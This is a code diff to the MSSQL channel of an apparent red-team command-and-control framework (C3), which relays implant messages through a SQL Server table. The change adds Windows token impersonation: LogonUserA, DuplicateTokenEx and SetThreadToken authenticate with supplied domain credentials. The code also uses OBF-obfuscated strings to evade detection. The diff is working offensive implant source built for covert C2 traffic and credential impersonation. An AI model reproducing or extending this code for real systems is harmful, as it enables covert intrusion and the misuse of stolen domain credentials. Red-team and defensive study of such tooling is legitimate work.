@@ -11,14 +11,32 @@ FSecure::C3::Interfaces::Channels::MSSQL::MSSQL(ByteView arguments)
 	: m_inboundDirectionName{ arguments.Read<std::string>() }
 	, m_outboundDirectionName{ arguments.Read<std::string>() }
 {
-	auto[servername, databasename, tablename, username, password] = arguments.Read<std::string, std::string, std::string, std::string, std::string>();
+	auto[servername, databasename, tablename, useSSPI, username, password] = arguments.Read<std::string, std::string, std::string, bool, std::string, std::string>();
 	this->servername = servername;
 	this->databasename = databasename;
 	this->tablename = tablename;
 	this->username = username;
 	this->password = password;
+	this->useSSPI = useSSPI;
 	
 	SQLHANDLE hConn = NULL, hStmt = NULL, hEvt = NULL;
+
+	//create a new impersonation token and inject it into the current thread.
+	if (useSSPI && !this->username.empty())
+	{
+		std::string user, domain;
+		HANDLE hToken;
+		user = this->username.substr(this->username.find("\\") + 1, this->username.size());
+		domain = this->username.substr(0, this->username.find("\\"));
+
+		if (!LogonUserA(user.c_str(), domain.c_str(), this->password.c_str(), LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken))
+			throw std::runtime_error("[x] error creating Token");
+
+		if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &impersonationToken))
+			throw std::runtime_error("[x] error duplicating token");
+
+		
+	}
 	
 	if (Connect(&hConn, &hEvt) == SQL_ERROR)
 		throw std::exception(OBF("[x] Unable to connect to MSSQL database"));
@@ -39,7 +57,7 @@ FSecure::C3::Interfaces::Channels::MSSQL::MSSQL(ByteView arguments)
 	{
 														
 		stmtString = OBF("CREATE TABLE dbo.") + this->tablename + OBF(" (ID INT IDENTITY(1,1) NOT NULL PRIMARY KEY, MSG varchar(max));");
-		std::cout << stmtString << std::endl;
+		
 		SQLFreeHandle(SQL_HANDLE_STMT, hStmt);
 		SQLAllocHandle(SQL_HANDLE_STMT, hConn, &hStmt);
 
@@ -156,6 +174,7 @@ SQLRETURN FSecure::C3::Interfaces::Channels::MSSQL::Connect(SQLHANDLE* hConn, SQ
 {
 	SQLCHAR ret[DATA_LEN];
 	SQLHANDLE lhConn = NULL, lhStmt = NULL, lhEvt = NULL;
+	std::string connString;
 
 	if (SQLAllocHandle(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &lhEvt) != SQL_SUCCESS)
 		throw std::exception(OBF("[x] Error allocating handle"));
@@ -164,8 +183,18 @@ SQLRETURN FSecure::C3::Interfaces::Channels::MSSQL::Connect(SQLHANDLE* hConn, SQ
 	if (SQLAllocHandle(SQL_HANDLE_DBC, lhEvt, &lhConn) != SQL_SUCCESS)
 		throw std::exception(OBF("[x] Error allocating handle"));
 
-	if(this->username.find("\\") != std::string::npos)
-		connString = OBF("DRIVER={SQL Server};SERVER=") + this->servername + OBF(", 1433;") + OBF("DATABASE=") + this->databasename + OBF(";Integrated Security=SSPI;UID=") + this->username + OBF(";PWD=") + this->password;
+	
+
+	if (this->useSSPI)
+	{
+		if (!this->username.empty())
+		{
+			if (!SetThreadToken(NULL, this->impersonationToken))
+				throw std::runtime_error("[x] error setting token");
+		}
+			
+		connString = OBF("DRIVER={SQL Server};SERVER=") + this->servername + OBF(", 1433;") + OBF("DATABASE=") + this->databasename + OBF(";Integrated Security=SSPI;Trusted Connection=yes;");
+	}
 	else
 		connString = OBF("DRIVER={SQL Server};SERVER=") + this->servername + OBF(", 1433;") + OBF("DATABASE=") + this->databasename + OBF(";UID=") + this->username + OBF(";PWD=") + this->password;
 
@@ -247,15 +276,23 @@ const char* FSecure::C3::Interfaces::Channels::MSSQL::GetCapability()
 				            "name": "Table Name",
 				            "description": "The name of the table to write to"
 			            },
+						{
+							"type": "boolean",
+							"name": "Use Current Windows Auth",
+							"description": "Set this to true to use SSPI",
+							"defaultValue": false
+						},
 			            {
 				            "type": "string",
 				            "name": "Username",
-				            "description": "The username used to authenticate to the database. If using a domain user put in the format DOMAIN\\Username"
+				            "description": "The username used to authenticate to the database. If using a domain user put in the format DOMAIN\\Username",
+							"min": 0
 			            },
 			            {
 				            "type": "string",
 				            "name": "Password",
-				            "description": "The password used to authenticate to the database"
+				            "description": "The password used to authenticate to the database",
+							"min": 0
 			            }
 		            ]
                 },
